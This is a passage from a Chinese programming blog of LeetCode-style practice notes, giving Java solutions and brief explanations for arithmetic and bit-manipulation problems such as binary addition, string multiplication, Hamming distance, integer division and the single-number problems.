= sum / <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">        l1--;</span><br><span class="line">        l2--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (carry != <span class="number">0</span>) res.append(carry);</span><br><span class="line">    <span class="keyword">return</span> res.reverse().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-二进制求和"><a href="#6-二进制求和" class="headerlink" title="6. 二进制求和"></a>6. 二进制求和</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">addBinary</span><span class="params">(String a, String b)</span> </span>&#123;</span><br><span class="line">        StringBuilder res = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> l1 = a.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> l2 = b.length() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(l1 &gt;= <span class="number">0</span> || l2 &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = l1 &lt; <span class="number">0</span> ? <span class="number">0</span> :a.charAt(l1) - <span class="string">'0'</span>;</span><br><span class="line">            <span class="keyword">int</span> y = l2 &lt; <span class="number">0</span> ? <span class="number">0</span> :b.charAt(l2) - <span class="string">'0'</span>;</span><br><span class="line">            <span class="keyword">int</span> sum = x + y + carry;</span><br><span class="line">            <span class="comment">//只需要将10改为2</span></span><br><span class="line">            res.append(sum % <span class="number">2</span>);</span><br><span class="line">            carry = sum / <span class="number">2</span>;</span><br><span class="line">            l1--;</span><br><span class="line">            l2--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry != <span class="number">0</span>)&#123;</span><br><span class="line">            res.append(carry);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> res.reverse().toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-两数相加"><a href="#7-两数相加" class="headerlink" title="7. 两数相加"></a>7. 两数相加</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int val, ListNode next) &#123; this.val = val; this.next = next; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode();</span><br><span class="line">        ListNode curr = dummy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(l1 != <span class="keyword">null</span> || l2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> x = l1 == <span class="keyword">null</span> ? <span class="number">0</span> : l1.val;</span><br><span class="line">            <span class="keyword">int</span> y = l2 == <span class="keyword">null</span> ? <span class="number">0</span> : l2.val;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">int</span> sum = x + y + carry;</span><br><span class="line">            curr.next = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>);</span><br><span class="line">            curr = curr.next;</span><br><span class="line">            carry = sum / <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (l1 != <span class="keyword">null</span>) l1 = l1.next;</span><br><span class="line">            <span class="keyword">if</span> (l2 != <span class="keyword">null</span>) l2 = l2.next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry != <span class="number">0</span>)&#123;</span><br><span class="line">            curr.next = <span class="keyword">new</span> ListNode(carry);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-字符串相乘"><a href="#8-字符串相乘" class="headerlink" title="8. 字符串相乘"></a>8. 字符串相乘</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">multiply</span><span class="params">(String num1, String num2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (num1.equals(<span class="string">"0"</span>) || num2.equals(<span class="string">"0"</span>)) <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> m = num1.length(), n = num2.length();</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[m + n];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = m - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">int</span> x = num1.charAt(i) - <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = n - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">int</span> y = num2.charAt(j) - <span class="string">'0'</span>;</span><br><span class="line">            <span class="keyword">int</span> sum = res[i + j + <span class="number">1</span>] + x * y;</span><br><span class="line">            res[i + j + <span class="number">1</span>] = sum % <span class="number">10</span>;</span><br><span class="line">            res[i + j] += sum / <span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; res.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">0</span> &amp;&amp; res[i] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        sb.append(res[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-计数质数"><a href="#9-计数质数" class="headerlink" title="9. 计数质数"></a>9. 计数质数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countPrimes</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] isPrime = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">        Arrays.fill(isPrime, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isPrime[i] == <span class="number">1</span>) &#123;</span><br><span class="line">                ans += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> ((<span class="keyword">long</span>) i * i &lt; n) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> j = i * i; j &lt; n; j += i) &#123;</span><br><span class="line">                        isPrime[j] = <span class="number">0</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-数字1的个数"><a href="#10-数字1的个数" class="headerlink" title="10. 数字1的个数"></a>10. 数字1的个数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">countDigitOne</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// bug 修复：i 应该是长整型，要不然会溢出</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">long</span> i = <span class="number">1</span>; i &lt;= n; i *= <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="comment">// (n/10)*1 + min(max((n%10 - 1 + 1), 0), 1)</span></span><br><span class="line">            <span class="comment">// (n/100)*10 + min(max((n%100 - 10 + 1), 0), 10)</span></span><br><span class="line">            <span class="comment">// (n/1000)*100 + min(max((n%1000 - 100 + 1), 0), 100)</span></span><br><span class="line">            <span class="keyword">long</span> divider = i * <span class="number">10</span>;</span><br><span class="line">            count += (n / divider) * i + Math.min(Math.max(n % divider - i + <span class="number">1</span>, <span class="number">0L</span>), i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-缀点成线"><a href="#11-缀点成线" class="headerlink" title="11. 缀点成线"></a>11. 缀点成线</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">checkStraightLine</span><span class="params">(<span class="keyword">int</span>[][] coordinates)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x0 = coordinates[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> y0 = coordinates[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> deltaX = coordinates[<span class="number">1</span>][<span class="number">0</span>] - x0;</span><br><span class="line">        <span class="keyword">int</span> deltaY = coordinates[<span class="number">1</span>][<span class="number">1</span>] - y0;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; coordinates.length; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> deltaYi = coordinates[i][<span class="number">1</span>] - y0;</span><br><span class="line">            <span class="keyword">int</span> deltaXi = coordinates[i][<span class="number">0</span>] - x0;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(deltaY * deltaXi != deltaYi * deltaX)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="刷题第六天"><a href="#刷题第六天" class="headerlink" title="刷题第六天"></a>刷题第六天</h2><h3 id="1-位1的个数"><a href="#1-位1的个数" class="headerlink" title="1. 位1的个数"></a>1. 位1的个数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">// you need to treat n as an unsigned value</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingWeight</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(n != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//去掉最后一位1</span></span><br><span class="line">            n &amp;= n - <span class="number">1</span>;</span><br><span class="line">            res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-汉明距离"><a href="#2-汉明距离" class="headerlink" title="2. 汉明距离"></a>2. 汉明距离</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s = x ^ y, ret = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (s != <span class="number">0</span>) &#123;</span><br><span class="line">            s &amp;= s - <span class="number">1</span>;</span><br><span class="line">            ret++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-汉明距离总和"><a href="#3-汉明距离总和" class="headerlink" title="3. 汉明距离总和"></a>3. 汉明距离总和</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">totalHammingDistance</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, n = nums.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; ++i) &#123;</span><br><span class="line">            <span class="keyword">int</span> c = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> val : nums) &#123;</span><br><span class="line">                c += (val &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ans += c * (n - c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-2的幂"><a href="#4-2的幂" class="headerlink" title="4. 2的幂"></a>4. 2的幂</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(n == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//当 n = -2147483648的时候， n - 1 就会溢出</span></span><br><span class="line">        <span class="keyword">long</span> x = n;</span><br><span class="line">        <span class="keyword">return</span> (x &amp; (x - <span class="number">1</span>)) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-两整数之和"><a href="#5-两整数之和" class="headerlink" title="5. 两整数之和"></a>5. 两整数之和</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(b != <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> carry = (a &amp; b) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            a = a ^ b;</span><br><span class="line">            b = carry;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-两数相除"><a href="#6-两数相除" class="headerlink" title="6. 两数相除"></a>6. 两数相除</h3><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210930212540.png" alt="image-20210930212400452"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210930212546.png" alt="image-20210930212535116"></p><p>b左移31位是会越界的，那怎么解决左移越界的问题？其实要比较a，b左移后的数字，就相当是比较a右移后的数字和b</p><p>若a为负最大值，那么abs(a)还是负最大值，且负最大值右移是负数，为了把a看成整数，采用把a无符号右移$i$位</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210930213657.png" alt="image-20210930213631921"></p><p>且要注意，任何数减去最小值还是最小值，所以可以将b移动大于等于符号的左边，才能正好把b当成正数看待，这样就能规避了把b看成最小值的情况</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20210930213833.png" alt="image-20210930213829451"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//O(1)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">divide</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (a == Integer.MIN_VALUE &amp;&amp; b == -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">int</span> sign = (a &gt; <span class="number">0</span>) ^ (b &gt; <span class="number">0</span>) ? -<span class="number">1</span> : <span class="number">1</span>;</span><br><span class="line">        a = Math.abs(a);</span><br><span class="line">        b = Math.abs(b);</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">31</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="comment">// 首先，右移的话，再怎么着也不会越界</span></span><br><span class="line">            <span class="comment">// 其次，无符号右移的目的是：将 -2147483648 看成 2147483648</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 注意，这里不能是 (a &gt;&gt;&gt; i) &gt;= b 而应该是 (a &gt;&gt;&gt; i) - b &gt;= 0</span></span><br><span class="line">            <span class="comment">// 这个也是为了避免 b = -2147483648，如果 b = -2147483648</span></span><br><span class="line">            <span class="comment">// 那么 (a &gt;&gt;&gt; i) &gt;= b 永远为 true，但是 (a &gt;&gt;&gt; i) - b &gt;= 0 为 false</span></span><br><span class="line">            <span class="keyword">if</span> ((a &gt;&gt;&gt; i) - b &gt;= <span class="number">0</span>) &#123; <span class="comment">// a &gt;= (b &lt;&lt; i)</span></span><br><span class="line">                a -= (b &lt;&lt; i);</span><br><span class="line">                res += (<span class="number">1</span> &lt;&lt; i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// bug 修复：因为不能使用乘号，所以将乘号换成三目运算符</span></span><br><span class="line">        <span class="keyword">return</span> sign == <span class="number">1</span> ? res : -res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-只出现过一次的数字"><a href="#7-只出现过一次的数字" class="headerlink" title="7. 只出现过一次的数字"></a>7. 只出现过一次的数字</h3><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211001084342.png" alt="image-20211001080952008"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> single = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">            single ^= num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> single;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>哈希查找（使用容器）和异或去重的思想一一致</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211001084335.png" alt="image-20211001081412672"></p><h3 id="8-只出现过一次的数字二"><a href="#8-只出现过一次的数字二" class="headerlink" title="8. 只出现过一次的数字二"></a>8. 只出现过一次的数字二</h3><p>如果1的个数不是3的倍数，说明那个只出现一次的数字的二进制中在着一位是1</p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211001084314717.png" alt="image-20211001084314717"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> oneCount = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> num: nums)&#123;</span><br><span class="line">                oneCount += (num &gt;&gt; i) &amp; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(oneCount % <span class="number">3</span> != <span class="number">0</span>)&#123;</span><br><span class="line">                res |= <span class="number">1</span> &lt;&lt; i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-只出现过一次的数字三"><a href="#9-只出现过一次的数字三" class="headerlink" title="9. 只出现过一次的数字三"></a>9. 只出现过一次的数字三</h3><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211001092143.png" alt="image-20211001092130656"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] singleNumber(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> bitmask = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//全部进行异或，得到两个出现一次的数字的异或结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">            bitmask ^= num;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//取到两个出现一次的数字的异或结果的最后一个1</span></span><br><span class="line">        <span class="keyword">int</span> diff = bitmask &amp; (-bitmask);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//分组</span></span><br><span class="line">        <span class="keyword">int</span>[] ans = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>((num &amp; diff) != <span class="number">0</span>)&#123;</span><br><span class="line">                ans[<span class="number">0</span>] ^= num;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         